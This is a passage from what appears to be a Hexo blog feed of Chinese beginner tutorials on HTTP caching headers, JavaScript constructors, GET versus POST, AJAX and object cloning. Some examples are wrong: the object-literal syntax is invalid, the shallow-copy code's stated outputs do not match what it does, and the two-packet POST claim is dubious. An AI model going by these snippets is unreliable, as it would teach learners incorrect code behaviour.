title="Etag和Last-Modified"></a>Etag和Last-Modified</h3><p>你可能会觉得使用Last-Modified已经足以让浏览器知道本地的缓存副本是否足够新，为什么还需要Etag（实体标识）呢？HTTP1.1中Etag的出现主要是为了解决几个Last-Modified比较难解决的问题：</p><ol><li>Last-Modified标注的最后修改只能精确到秒级，如果某些文件在1秒钟以内，被修改多次的话，它将不能准确标注文件的修改时间</li><li>如果某些文件会被定期生成，但内容并没有任何变化，但Last-Modified却改变了，导致文件没法使用缓存</li><li>有些文档可能被修改了，但所做修改并不重要。（比如对注释或拼写的修改）</li><li>有可能存在服务器没有准确获取文件修改时间，或者与代理服务器时间不一致等情形</li></ol><p>Etag是服务器自动生成或者由开发者生成的对应资源在服务器端的唯一标识符，能够更加准确的控制缓存。Last-Modified与ETag是可以一起使用的，<strong>服务器会优先验证ETag，一致的情况下，才会继续比对Last-Modified，最后才决定是否返回304。</strong></p><p>但是Etag也存在一些问题，比如：分布式系统尽量关闭掉Etag(每台机器生成的etag都会不一样)。Etag的服务器生成规则和强弱Etag的相关内容可以参考，《互动百科-Etag》,这里不再深入。</p><p>Last-Modified和ETags请求的http报头一起使用，服务器首先产生Last-Modified/Etag标记，服务器可在稍后使用它来判断页面是否已经被修改，来决定文件是否继续缓存，</p><ol><li>客户端请求一个页面（A）。</li><li>服务器返回页面A，并在给A加上一个Last-Modified/ETag。</li><li>客户端展现该页面，并将页面连同Last-Modified/ETag一起缓存。</li><li>客户再次请求页面A，并将上次请求时服务器返回的Last-Modified/ETag一起传递给服务器。</li><li>服务器检查该Last-Modified或ETag，并判断出该页面自上次客户端请求之后还未被修改，直接返回响应304和一个空的响应体。</li></ol><h3 id="Last-Modified-ETag与Cache-Control-Expires"><a href="#Last-Modified-ETag与Cache-Control-Expires" class="headerlink" title="Last-Modified/ETag与Cache-Control/Expires"></a>Last-Modified/ETag与Cache-Control/Expires</h3><p>如果检测到本地的缓存还是有效的时间范围内，浏览器直接使用本地副本，不会发送任何请求。两者一起使用时，Cache-Control/Expires的优先级要高于Last-Modified/ETag。即当本地副本根据Cache-Control/Expires发现还在有效期内时，则不会再次发送请求去服务器询问修改时间（Last-Modified）或实体标识（Etag）了。</p><p>一般情况下，使用Cache-Control/Expires会配合Last-Modified/ETag一起使用，因为即使服务器设置缓存时间, 当用户点击“刷新”按钮时，浏览器会忽略缓存继续向服务器发送请求，这时Last-Modified/ETag将能够很好利用304，从而减少响应开销。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><img src="http://upload-images.jianshu.io/upload_images/4869616-c7b6a0e81954a488.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="last1.png"></p><p><img src="http://upload-images.jianshu.io/upload_images/4869616-0b7a10398d925b86.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="last2.png"></p><blockquote><p>本文整理自<a href="http://www.zyy1217.com/2017/05/14/HTTP%E7%BC%93%E5%AD%98%E8%AF%A6%E8%A7%A3/" target="_blank" rel="noopener">《HTTP权威指南》之缓存详解</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;http://upload-images.jianshu.io/upload_images/4869616-57732386f1ec1dea.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240&quot; 
      
    
    </summary>
    
      <category term="http" scheme="http://yoursite.com/categories/http/"/>
    
    
      <category term="http" scheme="http://yoursite.com/tags/http/"/>
    
  </entry>
  
  <entry>
    <title>构造函数</title>
    <link href="http://yoursite.com/2017/09/14/02-%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0/"/>
    <id>http://yoursite.com/2017/09/14/02-构造函数/</id>
    <published>2017-09-14T03:30:14.000Z</published>
    <updated>2017-09-14T03:30:14.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h2><h4 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h4><p>笔者的理解:具有特定的属性与方法的封装集合. </p><p>面向对象的优势: </p><ol><li>暴露在全局中的只有一个对象名,不会造成全局变量污染</li><li>是用对象将代码进行功能模块化的划分,有利于日后的维护</li></ol><h5 id="创建对象的方法"><a href="#创建对象的方法" class="headerlink" title="创建对象的方法:"></a>创建对象的方法:</h5><ul><li>对象字面量法(key:value,key:value…)<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> zzw&#123;</span><br><span class="line">    name:<span class="string">"zzw"</span>,</span><br><span class="line">    age:<span class="string">'20'</span>,</span><br><span class="line">    major:<span class="string">'cs'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>缺点:冗余度过高,若需要创建属性一致的对象需要不断写对象字面量,不断重复</p><ul><li>工厂函数法(利用对象的动态特性)<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createObj</span>(<span class="params">name,age,major</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line">    obj.name=name;</span><br><span class="line">    obj.age=age;</span><br><span class="line">    obj.major=major;</span><br><span class="line">    <span class="keyword">return</span> obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> xzq=createObj(<span class="string">"xzq"</span>,<span class="string">"111"</span>,<span class="string">"111"</span>);</span><br><span class="line"><span class="keyword">var</span> xzq=createObj(<span class="string">"zjl"</span>,<span class="string">"222"</span>,<span class="string">"222"</span>);</span><br></pre></td></tr></table></figure></li></ul><p>缺点:通过工厂函数创建的对象之间并无关联性</p><ul><li>自定义构造函数</li></ul><p>构造函数其实也是函数,只不过是用来初始化对象的,与new同时使用.</p><p>new是用来创建对象的.</p><p>构造函数是用来初始化对象的.</p><p>构造函数名首字母大写,以示区分.<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">name,job</span>)</span>&#123;</span><br><span class="line">    <span class="comment">//默认隐含的操作,将new创建的对象赋值给this</span></span><br><span class="line">    <span class="keyword">this</span>.name=name;</span><br><span class="line">    <span class="keyword">this</span>.job=job;</span><br><span class="line">    <span class="keyword">this</span>.sayHello=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'hello'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> winter = <span class="keyword">new</span> Person(<span class="string">"winter"</span>,<span class="string">"coding"</span>);</span><br></pre></td></tr></table></figure></p><h5 id="构造函数的执行过程"><a href="#构造函数的执行过程" class="headerlink" title="构造函数的执行过程:"></a>构造函数的执行过程:</h5><ul><li>使用new关键字创建对象;</li><li>调用构造函数,将新创建出来的对象赋值给对象函数内部的this;</li><li>在构造函数内部使用this为新创建的对象新增成员;</li><li>默认返回新创建的对象,普通函数如果不写返回语句,会返回undefined.</li></ul><h5 id="构造函数的返回值"><a href="#构造函数的返回值" class="headerlink" title="构造函数的返回值:"></a>构造函数的返回值:</h5><ul><li>默认返回的事新创建的对象;</li><li>如果我们在构造函数中手动return基本类型的值或null,则不会影响构造函数默认的返回值;</li><li>若手动return的是对象类型,则会返回这个对象.</li></ul><p>若像调用普通函数那样调用构造函数,而没有使用new关键字,则没有创建对象,构造函数中this指向window.切记,这是一种错误的使用方式.</p><p>如果构造函数没有参数,那么调用的时候小括号可以省略,最好不要.</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;构造函数&quot;&gt;&lt;a href=&quot;#构造函数&quot; class=&quot;headerlink&quot; title=&quot;构造函数&quot;&gt;&lt;/a&gt;构造函数&lt;/h2&gt;&lt;h4 id=&quot;对象&quot;&gt;&lt;a href=&quot;#对象&quot; class=&quot;headerlink&quot; title=&quot;对象&quot;&gt;&lt;/a&gt;对象&lt;/h
      
    
    </summary>
    
      <category term="js" scheme="http://yoursite.com/categories/js/"/>
    
    
      <category term="js" scheme="http://yoursite.com/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>HTTP中GET与POST的区别</title>
    <link href="http://yoursite.com/2017/09/14/GET%E4%B8%8EPOST/"/>
    <id>http://yoursite.com/2017/09/14/GET与POST/</id>
    <published>2017-09-14T03:30:08.000Z</published>
    <updated>2017-09-14T03:30:08.000Z</updated>
    
    <content type="html"><![CDATA[<ol><li>GET在浏览器回退时是无害的，而POST会再次提交请求。</li><li>GET产生的URL地址可以被Bookmark，而POST不可以。</li><li>GET请求会被浏览器主动cache，而POST不会，除非手动设置。</li><li>GET请求只能进行url编码，而POST支持多种编码方式。</li><li>GET请求参数会被完整保留在浏览器历史记录里，而POST中的参数不会被保留。</li><li>GET请求在URL中传送的参数是有长度限制的，而POST没有。</li><li>对参数的数据类型，GET只接受ASCII字符，而POST没有限制。</li><li>GET比POST更不安全，因为参数直接暴露在URL上，所以不能用来传递敏感信息。<br>GET参数通过URL传递，POST放在Request body中。</li></ol><p>GET和POST是什么?</p><p>HTTP协议中的两种发送请求的方法。</p><p>HTTP是什么?</p><p>HTTP是基于TCP/IP的关于数据如何在万维网中如何通信的协议。</p><p>HTTP的底层是TCP/IP。所以GET和POST的底层也是TCP/IP，也就是说，GET/POST都是TCP链接。GET和POST能做的事情是一样一样的。</p><p>你要给GET加上request body，给POST带上url参数，技术上是完全行的通的。</p><p>业界不成文的规定是，(大多数)浏览器通常都会限制url长度在2K个字节，而(大多数)服务器最多处理64K大小的url。超过的部分，恕不处理。如果你用GET服务，在request body偷偷藏了数据，不同服务器的处理方式也是不同的，有些服务器会帮你卸货，读出数据，有些服务器直接忽略，所以，虽然GET可以带request body，也不能保证一定能被接收到哦。</p><p>GET和POST还有一个重大区别，</p><p>简单的说：</p><p>GET产生一个TCP数据包;POST产生两个TCP数据包。</p><p>长的说：</p><p>对于GET方式的请求，浏览器会把http header和data一并发送出去，服务器响应200(返回数据);</p><p>而对于POST，浏览器先发送header，服务器响应100 continue，浏览器再发送data，服务器响应200 ok(返回数据)。</p><p>也就是说，GET只需要汽车跑一趟就把货送到了，而POST得跑两趟，第一趟，先去和服务器打个招呼“嗨，我等下要送一批货来，你们打开门迎接我”，然后再回头把货送过去。<br>因为POST需要两步，时间上消耗的要多一点，看起来GET比POST更有效。因此Yahoo团队有推荐用GET替换POST来优化网站性能。但这是一个坑!跳入需谨慎。为什么?</p><p>GET与POST都有自己的语义，不能随便混用。<br>据研究，在网络环境好的情况下，发一次包的时间和发两次包的时间差别基本可以无视。而在网络环境差的情况下，两次包的TCP在验证数据包完整性上，有非常大的优点。<br>并不是所有浏览器都会在POST中发送两次包，Firefox就只发送一次。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;ol&gt;
&lt;li&gt;GET在浏览器回退时是无害的，而POST会再次提交请求。&lt;/li&gt;
&lt;li&gt;GET产生的URL地址可以被Bookmark，而POST不可以。&lt;/li&gt;
&lt;li&gt;GET请求会被浏览器主动cache，而POST不会，除非手动设置。&lt;/li&gt;
&lt;li&gt;GET请求只能进
      
    
    </summary>
    
      <category term="http" scheme="http://yoursite.com/categories/http/"/>
    
    
      <category term="http" scheme="http://yoursite.com/tags/http/"/>
    
  </entry>
  
  <entry>
    <title>初识ajax</title>
    <link href="http://yoursite.com/2017/09/13/%E5%85%B3%E4%BA%8Eajax/"/>
    <id>http://yoursite.com/2017/09/13/关于ajax/</id>
    <published>2017-09-13T05:33:40.000Z</published>
    <updated>2017-09-13T05:33:40.000Z</updated>
    
    <content type="html"><![CDATA[<p>在学习ajax之前,如果想要发出http请求(form表单或者输入地址回车),页面会整个刷新,极其影响用户体验.  </p><p>我的理解就是ajax可以使得开发者在自定义的事件触发下进行http请求,因为是通过js完成的,可以在页面不进行刷新的情况下达到动态更新页面内容的效果.</p><p>AJAX = Asynchronous JavaScript and XML（异步的 JavaScript 和 XML）。</p><p>AJAX 不是新的编程语言，而是一种使用现有标准的新方法。</p><p>AJAX 是在不重新加载整个页面的情况下,与服务器交换数据并更新部分网页的艺术。</p><p>百度的搜索推荐就是通过ajax向服务器发出请求,极少量的数据信息想要传递给服务器没必要刷新整个页面,ajax就是实现在不进行页面刷新的情况下向服务器发出http请求.</p><p>如何实现?<br>通过浏览器端的js帮我们预定义的一个异步对象来完成的XMLHttpRequest. </p><p>XMLHttpRequest 是 AJAX 的基础。</p><p>发送ajax请求需要5步</p><ol><li>创建异步对象  XMLHttpRequest</li></ol><p>XMLHttpRequest(兼容问题)  </p><ol><li><p>设置请求的url等参数open</p></li><li><p>发送请求(请求报文,http请求)send<br>思考:为什么没有get方法<br>因为网络请求是耗时的,只有通过某个事件的发生来获取信息,比如请求状态的改变<br>如果存在get方法,什么时候调用?onreadystatechange?那和标准流程又有什么区别.</p></li><li><p>注册事件(需要判断请求状态) onreadystatechange</p></li></ol><p>onreadystatechange 事件<br>当请求被发送到服务器时，我们需要执行一些基于响应的任务。</p><p>每当 readyState 改变时，就会触发 onreadystatechange 事件。</p><p>readyState 属性存有 XMLHttpRequest 的状态信息。</p><p>onreadystatechange 存储函数（或函数名），每当 readyState 属性改变时，就会调用该函数。<br>readyState 存有 XMLHttpRequest 的状态。从 0 到 4 发生变化。</p><p>0: 请求未初始化<br>1: 服务器连接已建立<br>2: 请求已接收<br>3: 请求处理中<br>4: 请求已完成，且响应已就绪 </p><p>status 200: “OK”</p><p>404: 未找到页面</p><p>在 onreadystatechange 事件中，我们规定当服务器<strong>响应已做好被处理的准备时</strong>所执行的任务。</p><p>当 readyState 等于 4 且状态为 200 时，表示响应已就绪：</p><ol><li>在注册的事件中获取返回的内容并修改页面的显示</li></ol><p>数据是保存在异步对象的responseText属性中</p><p>实际操作:</p><ul><li>先写.html页面 通过某种条件发出ajax请求</li><li>再写.php页面 处理发过来的请求</li><li>再回到浏览器异步对象onreadystatechange事件中 处理返回的内容</li></ul><p>上面我们是发送请求获得数据,倘若要发送数据到服务器端怎么办?</p><p>ajax通过get方法发送数据给服务器  </p><p>如果希望通过 GET 方法发送信息，请向 URL 添加信息：  </p><p>在open方法参数url中拼接要穿给服务器的数据xxx.php?userName=jack(动态拼接)  </p><p>比如用户名注册重复检测:  </p><p>blur时触发ajax事件,需要将输入的用户名传递给后台php页面,这时不是通过表单传递的,没有submit,需要我们手动将数据传给后台,我们可以通过js获取用户输入的用户名,拼接在url后面发送请求.  </p><pre><code>xmlhttp.open(&apos;get&apos;,&apos;check.php?userName=&apos;+un);  xmlhttp.send();</code></pre><p>ajax通过post方法发送数据给服务器  </p><p>如果需要像 HTML 表单那样 POST 数据，请使用 setRequestHeader() 来添加 HTTP 头。  </p><p>然后在 send() 方法中规定您希望发送的数据：  </p><pre><code>xmlhttp.open(&apos;post&apos;,&apos;changeStar.php&apos;);  xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);  xmlhttp.send(&apos;starName=&apos;+this.dataset[&apos;star&apos;]);  </code></pre><p>为什么要添加http头,因为post是将参数放到http后面的  </p><p>而get传参数的方式就是通过虚拟地址传送</p><ul><li>封装 ajax函数<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ajax_tool</span>(<span class="params">url,method,data,success</span>)</span>&#123;</span><br><span class="line"><span class="comment">//异步对象</span></span><br><span class="line"><span class="keyword">var</span> xmlhttp = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line"><span class="comment">//url方法,get与post需要分别处理</span></span><br><span class="line"><span class="keyword">if</span>(method==<span class="string">'get'</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(data)&#123;</span><br><span class="line">url+=<span class="string">'?'</span>;</span><br><span class="line">url+=data;</span><br><span class="line">&#125;</span><br><span class="line">xmlhttp.open(method,url);</span><br><span class="line">xmlhttp.send();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">xmlhttp.open(method,url);</span><br><span class="line">xmlhttp.setRequestHeader(<span class="string">"Content-type"</span>,<span class="string">"application/x-www-form-urlencoded"</span>);</span><br><span class="line"><span class="keyword">if</span>(data)&#123;</span><br><span class="line">xmlhttp.send(data);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">xmlhttp.send();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">xmlhttp.onreadystatechange=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(xmlhttp.readyState==<span class="number">4</span>&amp;&amp;xmlhttp.status==<span class="number">200</span>)&#123;</span><br><span class="line"><span class="comment">//console.log(xmlhttp.responseText);</span></span><br><span class="line"><span class="comment">//然而工具函数并不能进行数据操作</span></span><br><span class="line"><span class="comment">//没有任何一个工具可以应对千奇百怪的需求</span></span><br><span class="line"><span class="comment">//所以这里我们需要将数据返回,但是return是不行的</span></span><br><span class="line"><span class="comment">//添加事件响应后,工具函数已执行完毕,并没有立刻执行事件函数,并没有返回值,外面接收不到</span></span><br><span class="line"><span class="comment">//使用回调函数,传入一个函数作为参数,当事件终于被触发时,可以通过这个函数来对数据直接进行操作</span></span><br><span class="line">success(xmlhttp.responseText);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure> </li><li>简化ajax函数,参数过多每次都叫记得参数顺序,可以直接传入一个对象,取得对象属性值即可.此处不做演示.</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在学习ajax之前,如果想要发出http请求(form表单或者输入地址回车),页面会整个刷新,极其影响用户体验.  &lt;/p&gt;
&lt;p&gt;我的理解就是ajax可以使得开发者在自定义的事件触发下进行http请求,因为是通过js完成的,可以在页面不进行刷新的情况下达到动态更新页面内容
      
    
    </summary>
    
      <category term="http" scheme="http://yoursite.com/categories/http/"/>
    
    
      <category term="http" scheme="http://yoursite.com/tags/http/"/>
    
  </entry>
  
  <entry>
    <title>浅克隆与深克隆</title>
    <link href="http://yoursite.com/2017/09/13/%E6%B5%85%E5%85%8B%E9%9A%86%E4%B8%8E%E6%B7%B1%E5%85%8B%E9%9A%86/"/>
    <id>http://yoursite.com/2017/09/13/浅克隆与深克隆/</id>
    <published>2017-09-12T16:08:08.000Z</published>
    <updated>2017-09-12T16:08:08.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="浅克隆与深克隆"><a href="#浅克隆与深克隆" class="headerlink" title="浅克隆与深克隆"></a>浅克隆与深克隆</h1><h2 id="一-js中的对象"><a href="#一-js中的对象" class="headerlink" title="一. js中的对象"></a>一. js中的对象</h2><p>谈到对象的克隆，必定要说一下对象的概念。</p><p>js中的数据类型分为两大类：原始类型和对象类型。</p><p>原始类型包括：数值number、字符串string、布尔值boolean、null、undefined.<br>基本数据类型保存在栈中，</p><p>对象类型包括：对象即是属性的集合，当然这里又有两个特殊的对象—-函数Array、数组（键值的有序集合）。<br>引用数据类型的值是对象，保存在堆中。</p><p>这两种类型在复制克隆的时候是有很大区别的。原始类型存储的是对象的实际数据，而对象类型存储的是对象的引用地址（对象的实际内容单独存放，为了减少数据开销通常存放在内存中）</p><p>这两种数据类型存储方式有很大区别，尤其是在参数传递上。可以看看下面的例子。</p><p>参数的传递</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setName</span>(<span class="params">obj</span>)</span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">  obj.name=<span class="string">"我是传递的"</span>; </span><br><span class="line">  obj=<span class="keyword">new</span> <span class="built_in">Object</span>(); </span><br><span class="line">  obj.name=<span class="string">"我是new出来的"</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">var</span> person=<span class="keyword">new</span> <span class="built_in">Object</span>(); </span><br><span class="line">setName(person); </span><br><span class="line"><span class="built_in">console</span>.log(person.name);</span><br></pre></td></tr></table></figure><p>以上代码的弹出值是:我是传递的，很多人可能会以为将会弹出“我是new出来的”，下面进行一下简单的分析:</p><p>在函数外面创建一个对象，并将对象的引用赋值给变量person，person中存储的是对象在内存中的存储地址，当为函数传递参数时，就是传递的在函数外面创建的对象的地址。<br>在函数中，obj的值即为person的值，指向外面创建的对象，并为其创建一个自定义属性name，然后又创建一个新的对象，并将新对象的地址赋值给obj(person一直没有变化，始终指向原来的对象)，这个时候obj指向的并不是函数外面创建的对象，所以外面对象name属性不会被改变。</p><p><img src="http://upload-images.jianshu.io/upload_images/4869616-3d98896d160e73b8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>总的来说，就是函数内创建object对象不会改变外面的属性值。最好画个内存图，马老师教我的，碰到值传递和引用传递一图足矣。当然，这个小例子只是为了让大家复习一下克隆的前置知识。</p><h2 id="克隆的概念"><a href="#克隆的概念" class="headerlink" title="克隆的概念"></a>克隆的概念</h2><ul><li><p>浅度克隆：原始类型为值传递，对象类型仍为引用传递，克隆对象修改引用类型的属性时会影响到原始对象。</p></li><li><p>深度克隆：所有元素或属性均完全复制，与原对象完全脱离，也就是说所有对于新对象的修改都不会反映到原对象中。</p></li></ul><h3 id="浅克隆"><a href="#浅克隆" class="headerlink" title="浅克隆"></a>浅克隆</h3><h4 id="浅克隆与赋值的区别"><a href="#浅克隆与赋值的区别" class="headerlink" title="浅克隆与赋值的区别"></a>浅克隆与赋值的区别</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj1 = &#123;</span><br><span class="line">    <span class="string">'name'</span> : <span class="string">'zhangsan'</span>,</span><br><span class="line">    <span class="string">'age'</span> :  <span class="string">'18'</span>,</span><br><span class="line">    <span class="string">'language'</span> : [<span class="number">1</span>,[<span class="number">2</span>,<span class="number">3</span>],[<span class="number">4</span>,<span class="number">5</span>]],</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj2 = obj1;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj3 = shallowCopy(obj1);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">shallowCopy</span>(<span class="params">src</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> dst = &#123;&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> prop <span class="keyword">in</span> src) &#123;</span><br><span class="line">        <span class="keyword">if</span> (src.hasOwnProperty(prop)) &#123;</span><br><span class="line">            dst[prop] = src[prop];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dst;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">obj2.name = <span class="string">"lisi"</span>;</span><br><span class="line">obj3.age = <span class="string">"20"</span>;</span><br><span class="line"></span><br><span class="line">obj2.language[<span class="number">1</span>] = [<span class="string">"二"</span>,<span class="string">"三"</span>];</span><br><span class="line">obj3.language[<span class="number">2</span>] = [<span class="string">"四"</span>,<span class="string">"五"</span>];</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(obj1);  </span><br><span class="line"><span class="comment">//obj1 = &#123;</span></span><br><span class="line"><span class="comment">//    'name' : 'lisi',</span></span><br><span class="line"><span class="comment">//    'age' :  '18',</span></span><br><span class="line"><span class="comment">//    'language' : [1,[4,5]],</span></span><br><span class="line"><span class="comment">//&#125;;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(obj2);</span><br><span class="line"><span class="comment">//obj2 = &#123;</span></span><br><span class="line"><span class="comment">//    'name' : 'lisi',</span></span><br><span class="line"><span class="comment">//    'age' :  '18',</span></span><br><span class="line"><span class="comment">//    'language' : [1,[4,5]],</span></span><br><span class="line"><span class="comment">//&#125;;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(obj3);</span><br><span class="line"><span class="comment">//obj3 = &#123;</span></span><br><span class="line"><span class="comment">//    'name' : 'zhangsan',</span></span><br><span class="line"><span class="comment">//    'age' :  '20',</span></span><br><span class="line"><span class="comment">//    'language' : [1,[4,5]],</span></span><br><span class="line"><span class="comment">//&#125;;</span></span><br></pre></td></tr></table></figure><p>先定义个一个原始的对象 obj1，然后使用赋值得到第二个对象 obj2，然后通过浅拷贝，将 obj1 里面的属性都赋值到 obj3 中。也就是说：</p><ul><li>obj1：原始数据</li><li>obj2：赋值操作得到</li><li>obj3：浅拷贝得到</li></ul><p>然后我们改变 obj2 的 name 属性和 obj3 的 name 属性，可以看到，改变赋值得到的对象  obj2 同时也会改变原始值 obj1，而改变浅拷贝得到的的 obj3 则不会改变原始对象 obj1。这就可以说明赋值得到的对象 obj2 只是将指针改变，其引用的仍然是同一个对象，而浅拷贝得到的的 obj3 则是<strong> 重新创建</strong>了新对象。</p><p>然而，我们接下来来看一下改变引用类型会是什么情况呢，我又改变了赋值得到的对象 obj2 和浅拷贝得到的 obj3 中的 language 属性的第二个值和第三个值（language 是一个数组，也就是引用类型）。结果见输出，可以看出来，无论是修改赋值得到的对象 obj2 和浅拷贝得到的 obj3 都会改变原始数据。</p><p>这是因为浅拷贝只复制一层对象的属性，并不包括对象里面的为引用类型的数据。所以就会出现改变浅拷贝得到的 obj3 中的引用类型时，会使原始数据得到改变。</p><p>深拷贝：将 B 对象拷贝到 A 对象中，包括 B 里面的子对象，</p><p>浅拷贝：将 B 对象拷贝到 A 对象中，但不包括 B 里面的子对象</p><h4 id="深克隆的实现"><a href="#深克隆的实现" class="headerlink" title="深克隆的实现"></a>深克隆的实现</h4><p>为了保证对象的所有属性都被复制到，我们必须知道如果for循环以后，得到的元素仍是Object或者Array，那么需要再次循环，直到元素是原始类型或者函数为止。为了得到元素的类型，我们定义一个通用函数，用来返回传入对象的类型。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//返回传递给他的任意对象的类</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isClass</span>(<span class="params">o</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(o===<span class="literal">null</span>) <span class="keyword">return</span> <span class="string">"Null"</span>;</span><br><span class="line">    <span class="keyword">if</span>(o===<span class="literal">undefined</span>) <span class="keyword">return</span> <span class="string">"Undefined"</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Object</span>.prototype.toString.call(o).slice(<span class="number">8</span>,<span class="number">-1</span>);<span class="comment">//[Object Array] =&gt;Array</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li><p>为什么不直接用toString方法？这是为了防止对象中的toString方法被重写，为了正确的调用toString()版本，必须间接的调用Function.call()方法</p></li><li><p>为什么不使用typeof来直接判断类型？因为对于Array而言，使用typeof（Array）返回的是object，所以不能得到正确的Array，这里对于后续的数组克隆将产生致命的问题。</p></li><li><p>确定是那种基本数据类型用typeof,确定是哪种引用数据类型用instanceof</p></li></ol><figure class="highlight js"><table><tr><td 